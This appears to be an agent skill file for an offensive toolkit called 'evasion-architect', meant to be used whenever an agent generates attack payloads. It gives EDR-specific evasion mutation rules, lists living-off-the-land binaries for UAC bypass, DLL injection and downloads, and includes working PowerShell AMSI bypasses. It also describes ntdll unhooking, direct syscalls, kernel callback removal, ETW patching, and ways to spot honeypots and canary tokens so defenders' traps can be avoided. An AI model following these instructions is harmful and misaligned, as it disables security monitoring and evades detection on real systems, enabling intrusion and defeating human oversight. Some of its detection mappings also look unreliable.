---
name: evasion-architect
description: |
  EDR/AV evasion mutations, LOLBAS compliance checker, honeypot/canary token detector.
  Ensures payloads bypass modern endpoint detection while avoiding defender traps.
  
  Use when: Generating any offensive payload, running commands on a target
  with active EDR, or interacting with any target that may deploy honeypots.
---

## USAGE

```bash
# Mutate payload for EDR evasion
python3 /home/workspace/BugCrusher/Skills/evasion-architect/scripts/evasion_mutator.py --payload "<original_payload>" --target edr|sandbox|av

# Check for honeypot/canary tokens
python3 /home/workspace/BugCrusher/Skills/evasion-architect/scripts/canary_detector.py --scan <target_or_log>

# LOLBAS compliance check
python3 /home/workspace/BugCrusher/Skills/evasion-architect/scripts/lolbas_check.py --command "<command>"

# AMSI bypass generator
python3 /home/workspace/BugCrusher/Skills/evasion-architect/scripts/amsi_bypass.py --technique patch|disable|redirect
```

## EDR EVASION MUTATION ENGINE

### Known EDR Detection Rules (Mapped)

| EDR | Triggers | Mutation Strategy |
|-----|----------|-----------------|
| CrowdStrike | PowerShell -W hidden -C <base64> | Use -NonInteractive + -Bypass |
| SentinelOne | certutil -urlcache -f | Use bitsadmin / Transfer |
| Carbon Black | mshta inline (no file) | Write .hta to disk first |
| Microsoft Defender | rundll32 javascript: | Use regsvr32 scrobj.dll |
| Palo Alto Traps | vssadmin delete shadows | Use WMI or vssadmin create |
| Sophos | samba/net binaries | Use SMB directly via impacket |
| Trellix (McAfee) | powershell -enc | Use -Enc with spacing |

### Mutation Rules

```
RULE 1: No base64 in command line
  BAD:  powershell -enc Base64String
  GOOD: powershell -Enc (with space after -Enc)

RULE 2: No direct download cradle in PowerShell
  BAD:  IEX (Invoke-WebRequest ...).Content
  GOOD: Use bitsadmin /transfer or net.webclient

RULE 3: No inline VBS in mshta
  BAD:  mshta vbscript:Execute("...")
  GOOD: Write .vbs to %TEMP% then execute

RULE 4: No direct rundll32 javascript:
  BAD:  rundll32 javascript:"\..\mshtml,RunHTMLApplication"
  GOOD: Use regsvr32 /s /n /u /i: scrobj.dll

RULE 5: No vssadmin delete in PowerShell
  BAD:  vssadmin delete shadows /for=C:
  GOOD: Use WMI or diskshadow alternative

RULE 6: AMSI bypass before any suspicious command
  ALWAYS: Patch AMSI before .NET execution
```

## LOLBAS COMPLIANCE

### Living-off-the-Land Binaries (Trustworthy Sources)

Only use binaries from Microsoft's signed list:

```
Windows LOLBAS:
- certutil.exe        (decode, url cache)
- bitsadmin.exe       (file transfer)
- cmstp.exe           (CMSTP UAC bypass)
- control.exe         (load .cpl)
- csc.exe             (compile .cs)
- csi.exe             (compile .csx)
- dllhost.exe         (COM surrogate)
- expand.exe          (expand cab)
- extrace32.exe       (IEProxy)
- forfiles.exe        (indirect execution)
- gpscript.exe        (logon script)
- hh.exe              (HTML help)
- ie4uinit.exe        (IE certificate)
- ieadmx.exe          (IE ADMX)
- infdefaultinstall.exe (inf install)
- jsc.exe             (compile .jsc)
- makecab.exe         (cab archive)
- mavinject.exe       (inject DLL)
- msconfig.exe        (system config)
- msdt.exe            (diagnostic)
- mshta.exe           (HTA execution)
- msiexec.exe         (install MSI)
- msxsl.exe           (XSL transform)
- netsh.exe           (network config)
- pcalua.exe          (process start)
- pcwrun.exe          (program compat)
- raistartup.exe      (RAI)
- reg.exe             (registry)
- regsvcs.exe         (register assembly)
- regsvr32.exe        (register DLL)
- rundll32.exe        (execute DLL)
- sc.exe              (service control)
- schtasks.exe        (scheduled tasks)
- vbscript.exe        (VBS execute)
- wmic.exe            (WMI)
- wusa.exe            (Windows update)
- xwizard.exe         (extensible wizard)
```

### Linux LOLBAS Equivalents

```
- curl wget            (download)
- python perl ruby php (interpreters)
- nc socat ncat       (netcat alternatives)
- crontab at          (scheduling)
- ld.so               (library injection)
- /proc/self/mem      (memory read/write)
- unshare nsenter     (namespace)
- systemd-run         (privilege escalation)
```

## HONEYPOT / CANARY DETECTOR

### Detection Patterns

```
CANARY TOKEN TYPES:
- AWS Access Keys: AKIA[0-9A-Z]{16} (fake, in logs = honeypot)
- GitHub Tokens: ghp_[0-9a-z]{36} (fake tokens planted)
- Generic API Keys: [a-zA-Z0-9]{32,} (fake)
- Honeypot Files: .htx, .ltx, .canary, .trap
- DNS Canaries: dns Canaries in subdomain enumeration
- Bitcoin Addresses: bc1... (fake addresses planted)

DETECTION CHECKLIST:
[ ] Check if AWS keys in target match known honeypot patterns
[ ] Check if domain has DNS canary records
[ ] Check for fake .git/ directory (honeypot repos)
[ ] Check for .ltx/.canary files during recon
[ ] Check for suspiciously public S3 buckets (known honeypots)
[ ] Check if program is listed on BugBountyWatch doghouse
[ ] Check if program has history of out-of-scope reports
```

### Database of Known Honeypot Programs

```
KNOWN HONEYPOT PROGRAMS:
- program/beta (always out of scope) → check scope carefully
- Any program with reward_budget: $0 for 6+ months
- Programs that auto-reject with "duplicate" without triage
- Private programs that appeared on public programs lists
```

## AMSI BYPASS TECHNIQUES

### Technique 1: Patch AMSI DLL in Memory

```powershell
# Non-disruptive patch (keeps AMSI for other processes)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### Technique 2: Disable via Registry

```powershell
# Requires elevation
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Scripting\Amsi\Enable" -Value 0
```

### Technique 3: Context Redirect (amsiContext)

```powershell
# Force error in AMSI context
[System.Management.Automation.Language.Parser]::ParseInput("", [ref]$null, [ref]$null)
```

## POWERTHIEF / TOKENSTeal EVASION

```
COMBAT EDR USERLAND HOOKS:

1. Unhooking (restore clean NTDLL.dll)
   - Dump clean ntdll.dll from disk
   - memcpy to address space
   - Overwrite hooked bytes

2. Syscall direct (No direct syscall stubs)
   - Use Syswhispers2/Syswhispers3
   - Generate syscall numbers dynamically
   - AV doesn't track custom syscall stubs

3. kernel callback removal (PsSetCreateProcessNotifyRoutine)
   - Remove fromEPROCESS callback array
   - Requires restore on exit

4. ETW patch (disable Event Tracing for Windows)
   - Patch EtwEventWrite
   - No logging to Windows Event Log
```

## EVASION CHECKLIST (Pre-Execution)

```
BEFORE RUNNING ANY PAYLOAD:
[ ] Check target EDR via fingerprinting
[ ] Mutate payload for target EDR
[ ] Verify no AMSI bypass needed
[ ] Confirm LOLBAS compliance
[ ] Check for canary tokens in target scope
[ ] Verify no fake AWS/GCP keys in target
[ ] Confirm target is not a known honeypot program
[ ] Check if payload hash is in threat intel
[ ] Verify no defender rules triggered by payload string
```